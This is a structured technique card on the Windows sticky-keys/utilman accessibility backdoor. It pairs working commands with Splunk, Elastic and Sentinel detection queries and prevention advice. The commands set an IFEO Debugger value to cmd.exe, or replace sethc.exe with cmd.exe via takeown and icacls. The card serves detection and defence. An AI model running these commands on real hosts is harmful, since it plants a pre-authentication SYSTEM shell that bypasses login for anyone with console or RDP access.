name: Accessibility Feature Backdoor (sethc/utilman + IFEO Debugger)
command: reg add "HKLM\...\Image File Execution Options\sethc.exe" /v Debugger /d cmd.exe /f
description: A pre-logon SYSTEM shell is obtained by abusing the Windows accessibility binaries reachable from the logon screen (sethc.exe via five Shift presses, utilman.exe via Win+U). Either replace the binary with cmd.exe/powershell, or set an Image File Execution Options (IFEO) Debugger value for sethc.exe/utilman.exe so the accessibility key launches cmd.exe as SYSTEM - usable locally or over RDP before any user authenticates.
source: MITRE ATT&CK T1546.008; MITRE T1546.012 (IFEO); public sticky-keys backdoor research
notes:
=== TWO VARIANTS (both need admin) ===
  1. IFEO Debugger (cleaner - no file replacement):
     reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "C:\Windows\System32\cmd.exe" /f
     # at the logon screen press Shift x5 -> cmd.exe opens as SYSTEM.
     # same for utilman.exe (triggered by Win+U).

  2. Binary replacement (noisier; needs TrustedInstaller ownership):
     takeown /f C:\Windows\System32\sethc.exe & icacls C:\Windows\System32\sethc.exe /grant Administrators:F
     copy /y C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe

=== ACCESSIBILITY TARGETS AT THE LOGON SCREEN ===
  sethc.exe    (Sticky Keys - 5x Shift)
  utilman.exe  (Utility Manager - Win+U)
  osk.exe, magnify.exe, narrator.exe, displayswitch.exe

=== WHY IT EVADES / IS POWERFUL ===
  - Works BEFORE logon, including over RDP (SYSTEM shell on the secure desktop).
  - IFEO variant leaves the original binary intact (no hash/signature change to sethc.exe).

=== ALTERNATIVES ===
  Run keys, services, scheduled tasks - but none give a pre-auth SYSTEM shell at the logon UI.

examples.label: Hunt: list IFEO Debugger values on accessibility binaries (defender)
examples.command: reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options" /s /v Debugger

references.title: MITRE ATT&CK T1546.012 - Image File Execution Options Injection

recommended.note: Run keys are a simpler logon persistence mechanism.
The backdoor is often triggered over RDP - enumerate RDP first.
Service persistence is another SYSTEM-level option.

defense.why_it_works: The accessibility binaries launch as SYSTEM from the logon desktop before any user authenticates. An IFEO Debugger value redirects their execution to cmd.exe, and binary replacement swaps the target outright - both documented Windows behaviours - so pressing the accessibility shortcut yields a SYSTEM shell with no credentials.
defense.prerequisites: Local administrator (to write the IFEO key under HKLM or to take ownership and replace the System32 binary). Physical access or RDP to reach the logon screen to trigger it.
defense.impact: T1546.008 / T1546.012. A pre-authentication SYSTEM command shell reachable from the logon UI (locally or over RDP), providing both persistence and a credential-free backdoor into the host.
defense.detection: High-fidelity: any Debugger value under Image File Execution Options\sethc.exe/utilman.exe/osk.exe/magnify.exe/narrator.exe (Sysmon EID 13); modification or replacement of the accessibility binaries in System32 (file integrity, Sysmon EID 11/2); and the strongest tell - cmd.exe/powershell.exe whose parent is winlogon.exe (the accessibility binary launched from the secure desktop).
defense.artifacts: Sysmon EID 13 (RegistryValueSet) on IFEO Debugger for accessibility binaries; Sysmon EID 11 (FileCreate) or integrity change on sethc.exe/utilman.exe; Security 4688 / Sysmon EID 1 with ParentImage winlogon.exe launching a shell; takeown/icacls command history.
defense.splunk_spl:
index=sysmon EventCode=13 TargetObject="*\\Image File Execution Options\\*" TargetObject IN ("*sethc.exe*","*utilman.exe*","*osk.exe*","*magnify.exe*","*narrator.exe*","*displayswitch.exe*") (TargetObject="*Debugger*")
| table _time, Computer, Image, TargetObject, Details
defense.elastic_kql: event.code:"13" and registry.path:*\\Image\ File\ Execution\ Options\\* and registry.path:(*sethc.exe* or *utilman.exe* or *osk.exe* or *magnify.exe*) and registry.value:Debugger
defense.sentinel_kql:
DeviceProcessEvents
| where InitiatingProcessFileName =~ "winlogon.exe"
| where FileName in~ ("cmd.exe","powershell.exe")
| project Timestamp, DeviceName, FileName, ProcessCommandLine, InitiatingProcessFileName
defense.prevention: Alert on any Debugger value under IFEO for the accessibility binaries (there is never a legitimate one); monitor integrity of the System32 accessibility binaries; disable sticky-keys/accessibility shortcuts at the logon screen via policy where feasible; require Network Level Authentication for RDP so the logon desktop is not reachable pre-auth; restrict local admin and audit takeown/icacls on System32.

detections.name: IFEO Debugger set on an accessibility binary
detections.logic:
index=sysmon EventCode=13 TargetObject="*\\Image File Execution Options\\*" TargetObject IN ("*sethc.exe\\Debugger","*utilman.exe\\Debugger","*osk.exe\\Debugger","*magnify.exe\\Debugger","*narrator.exe\\Debugger")
| table _time, Computer, Image, TargetObject, Details
detections.false_positives: Effectively none for accessibility-binary Debugger values
detections.tuning: Alert on any match; investigate immediately

detections.name: winlogon.exe spawning a shell (secure-desktop backdoor trigger)
detections.logic:
DeviceProcessEvents
| where InitiatingProcessFileName =~ "winlogon.exe"
| where FileName in~ ("cmd.exe","powershell.exe","powershell_ise.exe")
| project Timestamp, DeviceName, FileName, ProcessCommandLine
detections.false_positives: Extremely rare; winlogon does not normally spawn shells
